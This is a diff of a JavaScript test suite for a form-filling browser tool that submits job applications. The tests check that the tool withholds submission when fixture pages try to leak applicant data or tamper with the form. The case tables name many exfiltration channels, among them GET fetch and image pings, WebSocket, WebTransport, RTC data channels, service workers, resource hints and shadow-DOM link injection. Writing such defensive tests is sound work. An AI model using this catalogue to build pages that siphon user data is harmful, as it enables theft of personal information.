+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&department=engineering'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 accepts an external aria-owns required owner only with a populated bound backing entry', async () => {
+  const run = await runV4(
+    '/native-external-aria-owns-answered',
+    [{ type: 'fill', selector: '#aria-owns-email', value: 'applicant@example.com', label: 'email' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&department=engineering'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 required fieldset owner blocks when its native child entry is empty', async () => {
+  const run = await runV4(
+    '/native-required-fieldset-empty',
+    [{ type: 'fill', selector: '#fieldset-email', value: 'applicant@example.com', label: 'email' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.match(
+    run.result.requiredFieldConfirmation.passes[0].unresolved.join('\n'),
+    /required-fieldset/
+  );
+});
+
+test('v4 required fieldset owner accepts a populated native child without a duplicate blocker', async () => {
+  const run = await runV4(
+    '/native-required-fieldset-answered',
+    [{ type: 'fill', selector: '#fieldset-email', value: 'applicant@example.com', label: 'email' }]
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, [{
+    method: 'POST',
+    path: '/native-integrity-real',
+    body: 'email=applicant%40example.com&department=engineering'
+  }]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+});
+
+test('v4 blocks activation-time aria-label drift on an authorized submitter', async () => {
+  const run = await runV4(
+    '/native-aria-label-drift',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(run.result.requiredFieldConfirmation.passes[0].blockerReason, 'protected_surface_mutated');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 ignores a page-world late submit-label getter and preserves exact uploaded bytes', async () => {
+  const run = await runV4('/native-late-file-getter-substitution', [
+    { type: 'fill', selector: '#late-email', value: 'applicant@example.com', label: 'email' },
+    {
+      type: 'upload',
+      selector: '#late-resume',
+      label: 'resume',
+      file: {
+        name: 'resume.pdf',
+        mimeType: 'application/pdf',
+        base64: Buffer.from('resume').toString('base64')
+      }
+    }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.equal(run.requests.length, 1, JSON.stringify(run.requests, null, 2));
+  assertMultipartPost(run.requests[0], '/native-file-integrity-real', [
+    multipartTextPart('email', 'applicant@example.com'),
+    multipartFilePart('resume'),
+    multipartTextPart('getter_state', 'not_called')
+  ]);
+  assert.equal(run.result.submitOutcome.pressed, true);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+  assert.equal(run.result.finalSubmitChooser.outcome, 'selected');
+});
+
+for (const webSocketCase of [
+  ['pre-chooser fill', '/native-websocket-pre-chooser'],
+  ['final activation', '/native-websocket-activation']
+]) {
+  test('v4 blocks WebSocket transmission during ' + webSocketCase[0], async () => {
+    const run = await runV4(
+      webSocketCase[1],
+      minimalV4Fills('#native-email', '#native-resume')
+    );
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.websocketConnections, []);
+    assert.deepEqual(run.websocketFrames, []);
+    assert.deepEqual(run.requests, []);
+    assertScriptInterceptedPostTransport(run.result);
+  });
+}
+
+for (const routeInvisibleCase of [
+  {
+    name: 'RTCPeerConnection data channel from a caller fill handler',
+    fixture: '/native-rtc-pre-chooser',
+    expectedState: 'rtc:constructor-blocked'
+  },
+  {
+    name: 'WebTransport datagram from the final activation handler',
+    fixture: '/native-webtransport-activation',
+    expectedState: 'webtransport:constructor-blocked',
+    postSubmitStateObservable: false
+  },
+  {
+    name: 'WebSocketStream from a caller fill handler',
+    fixture: '/native-websocketstream-pre-chooser',
+    expectedState: 'websocketstream:constructor-blocked'
+  },
+  {
+    name: 'WebSocketStream from the final activation handler',
+    fixture: '/native-websocketstream-activation',
+    expectedState: 'websocketstream:constructor-blocked',
+    postSubmitStateObservable: false
+  },
+  {
+    name: 'service-worker registration from a caller fill handler',
+    fixture: '/native-serviceworker-pre-chooser',
+    expectedState: 'serviceworker:register-blocked'
+  },
+  {
+    name: 'blocked Worker constructor in an initial popup',
+    fixture: '/native-popup-route-invisible',
+    expectedState: 'popup-worker:blocked'
+  },
+  {
+    name: 'legacy three-argument document.open popup alias',
+    fixture: '/native-document-open-popup',
+    expectedState: 'document-open-popup:blocked'
+  },
+  {
+    name: 'WebSocketStream from an inline initial-load script',
+    fixture: '/native-initial-script-transport',
+    expectedState: 'initial-websocketstream:blocked'
+  },
+  {
+    name: 'dynamic dns-prefetch hint from a caller fill handler',
+    fixture: '/native-dns-prefetch-pre-chooser',
+    expectedState: 'dns-prefetch:hint-blocked'
+  },
+  {
+    name: 'dynamic preconnect hint from the final activation handler',
+    fixture: '/native-preconnect-activation',
+    expectedState: 'preconnect:hint-blocked',
+    postSubmitStateObservable: false
+  },
+  {
+    name: 'connected link rel setter after a caller fill handler',
+    fixture: '/native-connected-rel-pre-chooser',
+    expectedState: 'connected-rel-setter:blocked'
+  },
+  {
+    name: 'connected link relList token mutation from the final activation handler',
+    fixture: '/native-connected-rel-list-activation',
+    expectedState: 'connected-rel-list:blocked',
+    postSubmitStateObservable: false
+  },
+  {
+    name: 'connected ShadowRoot innerHTML link insertion from a caller fill handler',
+    fixture: '/native-shadow-hint-inner-html',
+    expectedState: 'shadow-inner-html:blocked'
+  },
+  {
+    name: 'inert-parser link insertion through a closed ShadowRoot',
+    fixture: '/native-closed-shadow-replace-children',
+    expectedState: 'closed-shadow-replace-children:blocked'
+  },
+  {
+    name: 'oversized link fragment insertion through a closed ShadowRoot',
+    fixture: '/native-closed-shadow-large-fragment',
+    expectedState: 'closed-shadow-large-fragment:blocked'
+  },
+  {
+    name: 'entity-encoded link markup through a closed ShadowRoot',
+    fixture: '/native-closed-shadow-entity-inner-html',
+    expectedState: 'closed-shadow-entity-inner-html:blocked'
+  },
+  {
+    name: 'Attr nodeValue rel mutation inside a closed ShadowRoot',
+    fixture: '/native-closed-shadow-attr-node-value',
+    expectedState: 'closed-shadow-attr-node-value:blocked'
+  },
+  {
+    name: 'NamedNodeMap rel insertion inside a closed ShadowRoot',
+    fixture: '/native-closed-shadow-named-node-map',
+    expectedState: 'closed-shadow-named-node-map:blocked'
+  },
+  {
+    name: 'split-token variadic document.write link insertion',
+    fixture: '/native-variadic-document-write',
+    expectedState: 'variadic-document-write:blocked'
+  },
+  {
+    name: 'nested iframe srcdoc link insertion in a shadow tree',
+    fixture: '/native-nested-iframe-srcdoc',
+    expectedState: 'nested-iframe-srcdoc:blocked'
+  },
+  {
+    name: 'ParentNode moveBefore with a prebuilt hint',
+    fixture: '/native-move-before-hint',
+    expectedState: 'move-before:blocked'
+  },
+  {
+    name: 'execCommand insertHTML with a route-invisible hint',
+    fixture: '/native-exec-command-hint',
+    expectedState: 'exec-command-insert-html:blocked'
+  },
+  {
+    name: 'href attribute retargeting in a shadow tree',
+    fixture: '/native-shadow-href-attribute',
+    expectedState: 'closed-shadow-href-attribute:blocked'
+  },
+  {
+    name: 'NamedNodeMap href retargeting in a shadow tree',
+    fixture: '/native-shadow-href-named-map',
+    expectedState: 'closed-shadow-href-named-map:blocked'
+  }
+]) {
+  test('v4 structurally blocks ' + routeInvisibleCase.name + ' and withholds the native POST', async () => {
+    const run = await runV4(
+      routeInvisibleCase.fixture,
+      minimalV4Fills('#native-email', '#native-resume'),
+      routeInvisibleCase.postSubmitStateObservable === false
+        ? []
+        : [{ type: 'extract', selector: '#transport-state' }]
+    );
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    if (routeInvisibleCase.postSubmitStateObservable === false) {
+      // Aborting the held native navigation can replace the document with Chromium's error page.
+      // The typed activation result is authoritative after that point, not post-submit page state.
+      assert.equal(run.result.submitOutcome.observationDisposition, 'post_submit_observation_failed');
+    } else {
+      assert.equal(
+        valueOf(run.result, '#transport-state'),
+        routeInvisibleCase.expectedState,
+        'the route-invisible primitive must be denied before it returns a usable transport'
+      );
+    }
+    assert.deepEqual(
+      run.requests,
+      [],
+      'an observed route-invisible attempt must withhold the caller-bound native endpoint write'
+    );
+    assertScriptInterceptedPostTransport(run.result);
+  });
+}
+
+test('v4 records a parser-time preconnect attempt in a post-fill data frame', async () => {
+  const run = await runV4('/native-data-frame-hint', [
+    ...minimalV4Fills('#native-email', '#native-resume'),
+    { type: 'waitForSelector', selector: '#data-frame-loaded', timeout: 5000 }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assertScriptInterceptedPostTransport(run.result);
+});
+
+test('v4 records a parser-time preconnect attempt in a noopener data popup', async () => {
+  const run = await runV4('/native-data-popup-hint', [
+    ...minimalV4Fills('#native-email', '#native-resume'),
+    { type: 'waitForSelector', selector: '#data-popup-attempted', timeout: 5000 }
+  ]);
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assertScriptInterceptedPostTransport(run.result);
+});
+
+for (const safeDomCase of [
+  ['/native-safe-string-replace-children', 'safe-string-replace-children:allowed'],
+  ['/native-safe-class-list-token', 'safe-class-list-token:allowed'],
+  ['/native-safe-markup-primitives', 'safe-markup-primitives:allowed'],
+  ['/native-stateful-rel-coercion', 'stateful-rel-coercion:normalized'],
+  ['/native-shadow-url-component', 'closed-shadow-url-component-expando:allowed']
+]) {
+  test('v4 route lock preserves safe DOM behavior for ' + safeDomCase[0], async () => {
+    const run = await runV4(
+      safeDomCase[0],
+      minimalV4Fills('#native-email', '#native-resume')
+    );
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.getExfilRequests, []);
+    assert.equal(run.requests.length, 1);
+    assertMultipartPost(run.requests[0], '/native-real', [
+      multipartTextPart('email', 'applicant@example.com'),
+      multipartFilePart('resume'),
+      multipartTextPart('transport_state', safeDomCase[1])
+    ]);
+    assert.equal(run.result.submitOutcome.pressed, true);
+    assert.equal(run.result.requiredFieldConfirmation.status, 'confirmed');
+  });
+}
+
+for (const getExfilCase of [
+  ['GET fetch during a caller fill handler', '/native-get-exfil-fetch'],
+  ['image URL during a caller fill handler', '/native-get-exfil-image'],
+  ['delayed GET fetch from final activation', '/native-get-exfil-activation-delayed']
+]) {
+  test('v4 blocks caller data exfiltration through ' + getExfilCase[0], async () => {
+    const run = await runV4(
+      getExfilCase[1],
+      minimalV4Fills('#native-email', '#native-resume')
+    );
+    assert.equal(run.status, 0, JSON.stringify(run.error));
+    assert.deepEqual(run.getExfilRequests, [], 'the caller value must never reach the GET endpoint');
+    assert.deepEqual(run.requests, [], 'the final native POST must remain withheld');
+    assert.equal(run.result.submitOutcome.pressed, false);
+    assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+    assert.equal(
+      run.result.requiredFieldConfirmation.passes[0].blockerReason,
+      'submit_transport_unpinned'
+    );
+    assert.equal(run.result.finalSubmitChooser.outcome, 'activation_blocked');
+  });
+}
+
+test('v4 rejects a cross-origin native submit before applicant data can be replayed', async () => {
+  const origin = `http://job-boards.greenhouse.io:${server.address().port}`;
+  const run = await runV4(
+    '/native-cross-site-cookie',
+    minimalV4Fills('#native-email', '#native-resume'),
+    [],
+    origin,
+    {
+      STRATUS_TEST_SEED_COOKIES_JSON: JSON.stringify([{
+        name: 'strict_session',
+        value: 'must-not-cross-site',
+        domain: '127.0.0.1',
+        path: '/',
+        sameSite: 'Strict',
+        secure: false
+      }])
+    }
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(
+    run.result.requiredFieldConfirmation.passes[0].blockerReason,
+    'submit_transport_unsupported'
+  );
+  assert.equal(run.result.finalSubmitChooser.outcome, 'transport_unsupported');
+});
+
+test('v4 rejects a formdata payload swap despite a page-realm SubtleCrypto sign monkeypatch', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-formdata-crypto-monkeypatch',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_payload_changed');
+  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 rejects page-state activation forgery after click-time novalidate mutation', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-page-state-forgery',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'protected_surface_mutated');
+  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
+});
 
 test('v4 synthetic SubmitEvent and FormDataEvent witnesses cannot authorize a native write', async () => {
   const { status, result, clicks: recorded, requests } = await runV4(
@@ -2686,9 +5575,67 @@ test('v4 synthetic SubmitEvent and FormDataEvent witnesses cannot authorize a na
   assert.deepEqual(recorded, []);
   assert.deepEqual(requests, []);
   assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_identity_changed');
+  // Script-constructed events are untrusted, so the isolated activation witness never accepts
+  // their FormData payload. This is a typed activation refusal, not evidence that the bound form
+  // identity itself changed.
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_formdata_unobserved');
+  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
+});
+
+test('v4 refuses a canceled trusted submit followed by cached direct form submission', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-activation-submit-cancel-direct-real',
+    minimalV4Fills('#native-email', '#native-resume')
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_event_canceled');
+  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
+});
+
+test('v4 binds the authorized required-state fingerprint across submit-gate installation', async () => {
+  const { status, result, error, clicks: recorded, requests } = await runV4(
+    '/native-activation-pre-arm-required',
+    minimalV4Fills('#native-email', '#native-resume'),
+    [],
+    undefined,
+    { STRATUS_TEST_PRE_ARM_ARIA_REQUIRED: '1' }
+  );
+  assert.equal(status, 0, JSON.stringify(error));
+  assert.deepEqual(recorded, []);
+  assert.deepEqual(requests, []);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(
+    result.requiredFieldConfirmation.passes[0].blockerReason,
+    'submit_activation_binding_changed'
+  );
+  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
+});
+
+test('v4 preserves a blocked ancillary attempt across submit-gate installation', async () => {
+  const run = await runV4(
+    '/native-activation-normal',
+    minimalV4Fills('#native-email', '#native-resume'),
+    [],
+    undefined,
+    { STRATUS_TEST_PRE_ARM_FETCH: '1' }
+  );
+  assert.equal(run.status, 0, JSON.stringify(run.error));
+  assert.deepEqual(run.clicks, []);
+  assert.deepEqual(run.getExfilRequests, []);
+  assert.deepEqual(run.requests, []);
+  assert.equal(run.result.submitOutcome.pressed, false);
+  assert.equal(run.result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(
+    run.result.requiredFieldConfirmation.passes[0].blockerReason,
+    'submit_transport_unpinned'
+  );
+  assert.equal(run.result.finalSubmitChooser.outcome, 'activation_blocked');
 });
 
 test('v4 rejects a matching-destination native navigation issued by an iframe clone', async () => {
@@ -2700,45 +5647,10 @@ test('v4 rejects a matching-destination native navigation issued by an iframe cl
   assert.deepEqual(recorded, []);
   assert.deepEqual(requests, []);
   assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked', JSON.stringify(result));
-  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unpinned');
-});
-
-test('v4 blocks GET image ping and alternate transports during authorized activation', async () => {
-  const { status, result, error, clicks: recorded, requests } = await runV4(
-    '/native-activation-side-channels',
-    minimalV4Fills('#native-email', '#native-resume')
-  );
-  assert.equal(status, 0, JSON.stringify(error));
-  assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
-  assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.finalSubmitChooser.outcome, 'activation_blocked');
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_transport_unpinned');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_event_canceled');
 });
-
-for (const [label, fixture] of [
-  ['form action', '/late-final-action-drift'],
-  ['hidden job id', '/late-final-hidden-drift'],
-  ['submit text', '/late-final-submit-text-drift']
-]) {
-  test('v4 immutable approval blocks late ' + label + ' drift during the final chooser', async () => {
-    const { status, result, clicks: recorded, requests } = await runV4(
-      fixture,
-      minimalV4Fills('#native-email', '#native-resume')
-    );
-    assert.equal(status, 0);
-    assert.deepEqual(recorded, []);
-    assert.deepEqual(requests, []);
-    assert.equal(result.submitOutcome.pressed, false);
-    assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-    assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'form_identity_changed');
-    assert.equal(result.finalSubmitChooser.outcome, 'selected');
-    assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
-  });
-}
 
 for (const activationMutation of [
   ['pointerdown', 'pointerdown', 'protected_surface_mutated'],
@@ -2747,6 +5659,8 @@ for (const activationMutation of [
   ['click', 'click', 'protected_surface_mutated'],
   ['submit-time action', 'submit-action', 'protected_surface_mutated'],
   ['submit-time association', 'submit-association', 'protected_surface_mutated'],
+  ['submit-time aria-required', 'submit-aria-required', 'protected_surface_mutated'],
+  ['submit-time starred marker', 'submit-star-marker', 'protected_surface_mutated'],
   ['cached native direct submit to the real form', 'cached-direct-real', 'submit_event_unobserved'],
   ['cached native direct submit to the decoy form', 'cached-direct-decoy', 'submit_event_unobserved']
 ]) {
@@ -2775,15 +5689,18 @@ test('v4 refuses a role button bare Send even on a successfully populated applic
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
   assert.equal(result.finalSubmitChooser.candidateCount, 0);
-  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
+  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 0);
 });
 
 test('v4 preserves explicit application wording but refuses a non-native role button', async () => {
   const { status, result, clicks: recorded } = await runV4('/workable-explicit-role', workableV4Fills());
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assertUnsupportedNativeSubmitter(result);
-  assert.equal(result.finalSubmitChooser.topScore, 3);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.equal(result.requiredFieldConfirmation, null);
+  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
+  assert.equal(result.finalSubmitChooser.candidateCount, 0);
+  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
 });
 
 test('v4 refuses bare Send when the submitter overrides the application form action', async () => {
@@ -2794,10 +5711,9 @@ test('v4 refuses bare Send when the submitter overrides the application form act
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
   assert.equal(screenshot, true);
-  assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-  assert.equal(result.finalSubmitChooser.candidateCount, 0);
-  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
+  assertScriptInterceptedNativeTransport(result);
+  assert.equal(result.finalSubmitChooser.candidateCount, 1);
+  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
   assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
   assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
@@ -2807,10 +5723,9 @@ test('v4 refuses bare Send when the application form targets a new browsing cont
   const { status, result, clicks: recorded } = await runV4('/workable-form-target', workableV4Fills());
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-  assert.equal(result.finalSubmitChooser.candidateCount, 0);
-  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
+  assertScriptInterceptedNativeTransport(result);
+  assert.equal(result.finalSubmitChooser.candidateCount, 1);
+  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
   assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
 });
@@ -2819,10 +5734,9 @@ test('v4 refuses bare Send when the document base targets a new browsing context
   const { status, result, clicks: recorded } = await runV4('/workable-base-target', workableV4Fills());
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-  assert.equal(result.finalSubmitChooser.candidateCount, 0);
-  assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
+  assertScriptInterceptedNativeTransport(result);
+  assert.equal(result.finalSubmitChooser.candidateCount, 1);
+  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
   assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
 });
@@ -2833,10 +5747,10 @@ test('v4 scopes native bare Send to its associated form, not its nearest ancesto
   assert.deepEqual(recorded, []);
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-  assert.equal(result.finalSubmitChooser.candidateCount, 1);
+  assert.equal(result.finalSubmitChooser.candidateCount, 0);
   assert.equal(result.finalSubmitChooser.viableCandidateCount, 0);
   assert.equal(result.finalSubmitChooser.addressedScopeCount, 1);
-  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 1);
+  assert.equal(result.finalSubmitChooser.bareSendCandidateCount, 0);
 });
 
 test('v4 invalidates text and file proofs that become read-only or disabled before submission', async () => {
@@ -2846,8 +5760,11 @@ test('v4 invalidates text and file proofs that become read-only or disabled befo
   ]);
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assertScriptInterceptedNativeTransport(result);
-  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
+  assert.equal(result.submitOutcome.pressed, false);
+  assert.ok(result.requiredFieldConfirmation, JSON.stringify(result, null, 2));
+  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
+  assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
 });
 
 test('v4 treats equal bare Send controls as ambiguous and clicks neither', async () => {
@@ -2862,13 +5779,13 @@ test('v4 treats equal bare Send controls as ambiguous and clicks neither', async
   assert.equal(result.finalSubmitChooser.topScoreCount, 2);
 });
 
-test('v4 explicit application wording outranks bare Send but cannot authorize a non-native button', async () => {
+test('v4 filters non-native explicit wording before evaluating the remaining bare Send', async () => {
   const { status, result, clicks: recorded } = await runV4('/workable-explicit-wins', workableV4Fills());
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
   assertUnsupportedNativeSubmitter(result);
-  assert.equal(result.finalSubmitChooser.viableCandidateCount, 2);
-  assert.equal(result.finalSubmitChooser.topScore, 3);
+  assert.equal(result.finalSubmitChooser.viableCandidateCount, 1);
+  assert.equal(result.finalSubmitChooser.topScore, 0);
   assert.equal(result.finalSubmitChooser.topScoreCount, 1);
 });
 
@@ -2923,70 +5840,30 @@ test('v4 activation capture blocks click drift before form or direct network han
   assert.equal(result.finalSubmitChooser.outcome, 'binding_changed');
 });
 
-test('v4 no-click blocks pre-chooser POST GET image ping WebSocket WebTransport and EventSource', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4('/workable-prechooser-auto-submit', [
+test('v4 no-click blocks pre-chooser fill change upload and select transports', async () => {
+  const { status, result, clicks: recorded } = await runV4('/workable-prechooser-auto-submit', [
     ...workableV4Fills(),
     { type: 'select', selector: '#prechooser-select', value: 'Dubai', label: 'location' }
   ]);
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation, null);
   assert.equal(result.finalSubmitChooser.outcome, 'ambiguous_submit');
 });
 
-test('v4 opt-in decline never clicks a radio on an unrelated form', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4(
-    '/cross-form-optin-decoy',
-    minimalV4Fills('#native-email', '#native-resume')
-  );
-  assert.equal(status, 0);
-  assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
-  assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'no_submit_control');
-});
-
-test('v4 binds form semantics before an applicant action and refuses action drift', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4('/action-boundary-drift', [
-    { type: 'click', selector: '#arm-boundary', label: 'arm_boundary_drift' },
-    {
-      type: 'fill',
-      selector: '#boundary-email',
-      value: 'applicant@example.com',
-      label: 'email',
-      optional: true
-    }
-  ], [
-    { type: 'extract', selector: '#boundary-email', attribute: 'value' }
-  ]);
-  assert.equal(status, 0);
-  assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
-  assert.equal(result.submitOutcome.pressed, false);
-  assert.equal(result.finalSubmitChooser.outcome, 'application_scope_invalid');
-  assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason,
-    'application_scope_semantics_changed');
-  assert.equal(result.extracted.find((entry) => entry.selector === '#boundary-email')?.value, '');
-});
-
 test('v4 refuses a two-field job alert form with native bare Send', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4('/job-alert-bare-send', [
+  const { status, result, clicks: recorded } = await runV4('/job-alert-bare-send', [
     { type: 'fill', selector: '#alert-email', value: 'applicant@example.com' },
     { type: 'fill', selector: '#keywords', value: 'engineering' }
   ]);
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
   assertScriptInterceptedNativeTransport(result);
-  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
-  assert.equal(result.exactPageUrlProof.beforeSubmit, result.exactPageUrlProof.expected);
 });
 
 test('v4 refuses a populated talent network even when its resume upload succeeded', async () => {
-  const { status, result, clicks: recorded, requests } = await runV4('/talent-pool-bare-send', [
+  const { status, result, clicks: recorded } = await runV4('/talent-pool-bare-send', [
     { type: 'fill', selector: '#talent-name', value: 'Mehek' },
     { type: 'fill', selector: '#talent-email', value: 'applicant@example.com' },
     {
@@ -2996,10 +5873,7 @@ test('v4 refuses a populated talent network even when its resume upload succeede
   ]);
   assert.equal(status, 0);
   assert.deepEqual(recorded, []);
-  assert.deepEqual(requests, []);
   assertScriptInterceptedNativeTransport(result);
-  assert.equal(result.exactPageUrlProof.beforeFinalChooser, result.exactPageUrlProof.expected);
-  assert.equal(result.exactPageUrlProof.beforeSubmit, result.exactPageUrlProof.expected);
 });
 
 test('v4 accepts snake_case application and resume identity tokens', async () => {
@@ -3096,11 +5970,11 @@ test('v4 reruns the chooser and refuses sibling text drift to a second bare Send
 });
 
 test('v4 refuses a same-node submitter value change during confirmation', async () => {
-  const { status, result, error, clicks: recorded } = await runV4(
+  const { status, result, clicks: recorded } = await runV4(
     '/confirmation-value-drift',
     [...minimalV4Fills('#confirm-email', '#confirm-resume'), { type: 'click', selector: '#arm' }]
   );
-  assert.equal(status, 0, JSON.stringify(error));
+  assert.equal(status, 0);
   assert.deepEqual(recorded, []);
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
@@ -3139,7 +6013,7 @@ test('v4 final chooser globally counts an unrelated form proof reactivated durin
   assert.deepEqual(recorded, []);
   assert.equal(result.submitOutcome.pressed, false);
   assert.equal(result.requiredFieldConfirmation.status, 'blocked');
-  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'submit_chooser_changed');
+  assert.equal(result.requiredFieldConfirmation.passes[0].blockerReason, 'successful_address_changed');
